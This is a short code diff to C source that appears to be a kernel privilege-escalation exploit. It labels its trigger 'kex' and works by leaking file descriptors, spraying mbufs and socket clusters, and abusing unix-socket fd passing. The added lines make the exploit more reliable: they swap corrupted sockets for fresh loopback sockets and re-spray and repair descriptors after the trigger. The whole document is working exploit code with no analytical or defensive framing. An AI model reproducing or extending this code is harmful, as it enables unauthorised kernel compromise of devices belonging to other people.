@@ -105,6 +105,7 @@ void send_shifted_fragment(int fd, char* src, size_t off, size_t sz, int is_fina
 #define NUM_PACKETS 256
 #define MAX_FDS 128
 #define FD_LEAK_SIZE 80
+#define CLEANUP_SIZE SPRAY_SIZE
 
 void push_mbuf(int* socks, int i)
 {
@@ -397,6 +398,8 @@ int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds)
     return 0;
 }
 
+void fix_fds(int* kp_bad_fds, int nfds);
+
 int trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
 {
     printf("starting kex...\n");
@@ -504,7 +507,9 @@ int trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
     int ss[32];
     struct pollfd pfd = {.events = POLLIN, .revents = 0};
     *kp_bad_fds_end++ = socks[bad1];
+    socks[bad1] = create_loopback();
     *kp_bad_fds_end++ = socks[bad2];
+    socks[bad2] = create_loopback();
     int bad_un = -1;
     for(int i = 0; i < NUM_UNIX; i++)
     {
@@ -521,6 +526,9 @@ int trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
             close(fd_to_pass[j]);
             if(*sel_cur == -1)
             {
+                for(int i = 0; i < CLEANUP_SIZE; i++)
+                    push_cluster(socks, i);
+                fix_fds(socks, CLEANUP_SIZE);
                 bad_un = i;
                 *kp_bad_fds_end++ = un[2*i];
                 *kp_bad_fds_end++ = un[2*i+1];
